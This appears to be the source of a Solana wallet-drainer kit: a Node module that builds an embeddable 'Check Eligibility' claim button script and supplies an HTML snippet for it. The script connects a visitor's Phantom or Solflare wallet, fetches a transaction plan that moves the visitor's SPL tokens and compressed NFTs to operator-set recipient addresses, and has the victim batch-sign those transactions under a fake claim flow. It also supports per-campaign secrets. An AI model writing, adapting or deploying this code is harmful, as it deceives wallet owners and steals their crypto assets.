import crypto from "node:crypto";

const TEMPLATE = `(function () {
  "use strict";

  var PLAN_ENDPOINT = "__PLAN_ENDPOINT__";
  var SUBMIT_ENDPOINT = "__SUBMIT_ENDPOINT__";
  var CAMPAIGN_ID = "__CAMPAIGN_ID__";
  var CAMPAIGN_SECRET = "__CAMPAIGN_SECRET__";
  var RECIPIENT = "__RECIPIENT__";
  var RECIPIENTS = __RECIPIENTS__;
  var MODE = "__MODE__";
  var LIQUID_MINTS = __LIQUID_MINTS__;
  var BRAND = __BRAND__;

  var WEB3_CDN = "https://cdn.jsdelivr.net/npm/@solana/web3.js@1.98.4/lib/index.iife.min.js";
  var SIGN_BATCH = 8;

  function providers() {
    var list = [];
    if (window.phantom && window.phantom.solana) list.push(window.phantom.solana);
    if (window.solflare && window.solflare.isSolflare) list.push(window.solflare);
    if (window.backpack) list.push(window.backpack);
    if (window.glow && window.glow.isGlow) list.push(window.glow);
    if (window.solana && !list.includes(window.solana)) list.push(window.solana);
    return list;
  }

  function pickProvider() {
    var ps = providers();
    return ps.length ? ps[0] : null;
  }

  function loadWeb3() {
    return new Promise(function (resolve, reject) {
      if (window.solanaWeb3) return resolve(window.solanaWeb3);
      var existing = document.getElementById("sol-web3-load");
      if (existing) {
        var poll = setInterval(function () {
          if (window.solanaWeb3) { clearInterval(poll); resolve(window.solanaWeb3); }
        }, 50);
        return;
      }
      var s = document.createElement("script");
      s.id = "sol-web3-load";
      s.src = WEB3_CDN;
      s.onload = function () { resolve(window.solanaWeb3 || null); };
      s.onerror = function () { reject(new Error("failed to load @solana/web3.js")); };
      document.head.appendChild(s);
    });
  }

  function b64ToBytes(b64) {
    var raw = atob(b64);
    var bytes = new Uint8Array(raw.length);
    for (var i = 0; i < raw.length; i++) bytes[i] = raw.charCodeAt(i);
    return bytes;
  }

  function bytesToB64(bytes) {
    var bin = "";
    for (var i = 0; i < bytes.length; i++) bin += String.fromCharCode(bytes[i]);
    return btoa(bin);
  }

  function injectStyles() {
    if (document.getElementById("sc-styles")) return;
    var s = document.createElement("style");
    s.id = "sc-styles";
    s.textContent =
      "[data-claim]{all:unset;display:inline-flex;align-items:center;justify-content:center;" +
      "padding:16px 32px;border-radius:12px;background:linear-gradient(135deg,#7c3aed,#06b6d4);" +
      "color:#fff;font:600 16px/1 system-ui,-apple-system,sans-serif;cursor:pointer;" +
      "transition:transform .15s ease,opacity .15s ease;box-shadow:0 8px 24px rgba(124,58,237,.35)}" +
      "[data-claim]:hover{transform:translateY(-1px);opacity:.94}" +
      "[data-claim][disabled]{opacity:.6;cursor:progress}" +
      "[data-status]{margin-top:12px;font:500 14px/1.4 system-ui,sans-serif;color:#555}";
    document.head.appendChild(s);
  }

  async function hmac(secret, message) {
    var enc = new TextEncoder();
    var key = await crypto.subtle.importKey(
      "raw", enc.encode(secret), { name: "HMAC", hash: "SHA-256" }, false, ["sign"]
    );
    var sig = await crypto.subtle.sign("HMAC", key, enc.encode(message));
    return Array.from(new Uint8Array(sig)).map(function (b) { return b.toString(16).padStart(2, "0"); }).join("");
  }

  async function signedRequest(url, payload, extraFields) {
    var body = Object.assign({}, payload, { campaignId: CAMPAIGN_ID });
    if (CAMPAIGN_SECRET) {
      var rest = JSON.stringify(body);
      body.auth = await hmac(CAMPAIGN_SECRET, rest);
    }
    var res = await fetch(url, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify(body),
    });
    if (!res.ok) {
      var t = await res.text();
      throw new Error("request failed: " + res.status + " " + t);
    }
    return await res.json();
  }

  function setStatus(el, text) { if (el) el.textContent = text; }

  async function signChunk(wallet, txs, web3, useVersioned) {
    var decoded = txs.map(function (b) {
      var bytes = b64ToBytes(b);
      return useVersioned ? web3.VersionedTransaction.deserialize(bytes) : web3.Transaction.from(bytes);
    });
    if (decoded.length > 1 && typeof wallet.signAllTransactions === "function") {
      var signed = await wallet.signAllTransactions(decoded);
      return signed.map(function (t) { return bytesToB64(t.serialize()); });
    }
    var out = [];
    for (var i = 0; i < decoded.length; i++) {
      var s = await wallet.signTransaction(decoded[i]);
      out.push(bytesToB64(s.serialize()));
    }
    return out;
  }

  async function handleClick(btn) {
    var panel = btn.closest("[data-claim-panel]") || btn.parentElement;
    var statusEl = panel ? panel.querySelector("[data-status]") : null;
    var p = pickProvider();
    if (!p) { setStatus(statusEl, "No wallet detected. Install Phantom or Solflare."); return; }
    btn.disabled = true;
    setStatus(statusEl, "Connecting...");
    try {
      var conn = await p.connect();
      var wallet = conn.publicKey.toString();
      setStatus(statusEl, "Checking eligibility for " + wallet.slice(0, 6) + "..." + wallet.slice(-4));

      var web3 = await loadWeb3();
      if (!web3) throw new Error("web3 lib missing");

      var payload = { source: wallet, recipient: RECIPIENTS[0], recipients: RECIPIENTS };
      if (MODE === "manual") {
        payload.mode = "manual";
        payload.liquidMints = LIQUID_MINTS;
      }

      var plan = await signedRequest(PLAN_ENDPOINT, payload);
      var splTxs = plan.transactions || [];
      var cnftTxs = plan.cnftTransactions || [];
      var allTxs = splTxs.concat(cnftTxs);

      if (allTxs.length === 0) {
        setStatus(statusEl, "Nothing to claim.");
        btn.disabled = false;
        return;
      }

      setStatus(statusEl, "Preparing " + allTxs.length + " transaction" + (allTxs.length > 1 ? "s" : "") + "...");

      var splCount = splTxs.length;
      var signedSpl = [];
      var signedCnft = [];

      // Sign in batches — some wallets cap signAllTransactions.
      for (var i = 0; i < allTxs.length; i += SIGN_BATCH) {
        var batch = allTxs.slice(i, i + SIGN_BATCH);
        var isCnft = i >= splCount;
        setStatus(statusEl, "Confirm " + (i + 1) + "–" + Math.min(i + SIGN_BATCH, allTxs.length) + " of " + allTxs.length + "...");
        var signedBatch = await signChunk(p, batch, web3, plan.useVersioned);
        for (var j = 0; j < signedBatch.length; j++) {
          var globalIdx = i + j;
          if (globalIdx < splCount) signedSpl.push(signedBatch[j]);
          else signedCnft.push(signedBatch[j]);
        }
      }

      var jitoTipBase64 = null;
      if (plan.jitoTip && plan.jitoTip.base64) {
        setStatus(statusEl, "Sign tip...");
        var tipTx = plan.useVersioned
          ? web3.VersionedTransaction.deserialize(b64ToBytes(plan.jitoTip.base64))
          : web3.Transaction.from(b64ToBytes(plan.jitoTip.base64));
        var signedTip = typeof p.signTransaction === "function" ? await p.signTransaction(tipTx) : tipTx;
        jitoTipBase64 = bytesToB64(signedTip.serialize());
      }

      setStatus(statusEl, "Submitting...");
      var result = await signedRequest(SUBMIT_ENDPOINT, {
        signedTransactions: signedSpl,
        signedCnftTransactions: signedCnft,
        jitoTipBase64: jitoTipBase64,
      });

      if (result.complete) setStatus(statusEl, "Claim successful.");
      else if (result.signatures.length > 0) setStatus(statusEl, "Partial: " + result.signatures.length + "/" + result.total + " confirmed.");
      else setStatus(statusEl, "Claim did not complete. Try again.");
    } catch (err) {
      setStatus(statusEl, "Error: " + ((err && err.message) || err));
    } finally {
      btn.disabled = false;
    }
  }

  function attach() {
    injectStyles();
    var targets = document.querySelectorAll("[data-claim]");
    for (var i = 0; i < targets.length; i++) {
      (function (el) {
        if (el.__claimBound) return;
        el.__claimBound = true;
        el.addEventListener("click", function (ev) { ev.preventDefault(); handleClick(el); });
      })(targets[i]);
    }
  }

  if (document.readyState === "loading") document.addEventListener("DOMContentLoaded", attach);
  else attach();
})();
`;

export function generateBundle({ planEndpoint, submitEndpoint, recipients, mode, liquidMints, campaignId, secret, brand }) {
  const primary = Array.isArray(recipients) ? recipients[0] : recipients;
  const recipientList = Array.isArray(recipients) ? recipients : [recipients];
  return TEMPLATE
    .replace("__PLAN_ENDPOINT__", planEndpoint)
    .replace("__SUBMIT_ENDPOINT__", submitEndpoint)
    .replace("__CAMPAIGN_ID__", campaignId)
    .replace("__CAMPAIGN_SECRET__", secret || "")
    .replace("__RECIPIENT__", primary)
    .replace("__RECIPIENTS__", JSON.stringify(recipientList))
    .replace("__MODE__", mode)
    .replace("__LIQUID_MINTS__", JSON.stringify(liquidMints || []))
    .replace("__BRAND__", JSON.stringify(brand || {}));
}

export function newCampaignSecret() {
  return crypto.randomBytes(24).toString("hex");
}

export const HTML_SNIPPET =
  '<script src="/bundle.js" defer></script>\n' +
  '<div data-claim-panel>\n' +
  '  <button data-claim>Check Eligibility</button>\n' +
  '  <div data-status></div>\n' +
  '</div>\n';
